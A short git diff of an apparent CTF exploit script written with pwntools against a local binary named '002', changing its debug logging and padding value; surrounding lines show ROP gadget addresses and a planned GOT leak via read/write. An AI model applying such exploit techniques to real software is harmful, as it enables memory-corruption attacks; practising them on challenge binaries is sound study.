@@ -3,7 +3,7 @@
 __author__ = "TaQini"
 from pwn import *
 
-context.log_level = 'debug'
+#context.log_level = 'debug'
 
 # load program
 p = process('002')
@@ -41,7 +41,7 @@ mmmcall = 0x400600
 ppppppr = 0x40061a
 
 # junkcode
-padding = 0x0
+padding = 0xdeadbeef
 
 # function1
 # read(1, write_got, 8)   
